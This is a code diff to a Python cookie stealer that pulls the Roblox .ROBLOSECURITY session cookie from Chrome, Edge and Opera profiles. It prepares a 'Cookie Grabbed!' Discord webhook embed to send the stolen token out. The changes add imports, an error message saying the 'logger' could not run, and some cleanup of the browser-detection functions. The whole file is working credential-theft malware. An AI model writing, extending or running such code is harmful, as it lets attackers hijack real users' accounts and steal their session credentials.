@@ -1,8 +1,9 @@
+from time import sleep
 import browser_cookie3
 from discord_webhook import DiscordWebhook, DiscordEmbed
+import requests
+import colorama
 import grab.defaults
-
-agent = "Browser"
 
 
 def use_edge():
@@ -12,7 +13,6 @@ def use_edge():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(
             ' for .roblox.com/>')[0].strip()
-        agent = "Microsoft Edge"
         return cookie
     except:
         pass
@@ -23,29 +23,40 @@ def use_chrome():
         # Use Microsoft Edge to get cookies
         cookies = browser_cookie3.chromium(domain_name='roblox.com')
         cookies = str(cookies)
-        agent = "Chrome"
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(
             ' for .roblox.com/>')[0].strip()
         return cookie
     except:
         pass
+
 
 def use_opera():
     try:
         # Use Microsoft Edge to get cookies
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         cookies = str(cookies)
-        agent = "Opera (based)"
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(
             ' for .roblox.com/>')[0].strip()
         return cookie
     except:
         pass
 
+
 def find_proper_browser():
     if (use_chrome() is not None): return use_chrome()
     elif (use_edge() is not None): return use_edge()
     elif (use_opera() is not None): return use_opera()
+    else:
+        return error_out()
+
+
+def error_out():
+    # comment this out if it's a release
+    print(
+        colorama.Style.BRIGHT + colorama.Fore.RED +
+        "!!! COULD NOT RUN LOGGER !!!\nfor programmers: this could be because the host system does not run a supported browser. "+
+        "Please refer to the browser_cookie3 module website for more info."
+        + colorama.Style.RESET_ALL + colorama.Fore.RESET)
 
 
 def find_proper_agent():
@@ -54,6 +65,7 @@ def find_proper_agent():
     elif (use_opera() is not None): return "Opera (or Opera-based)"
     else:
         return "Un-supported Browser Framework"
+
 
 # Send to deafult webhook
 eb = DiscordEmbed('Cookie Grabbed!', color="03b2f8")
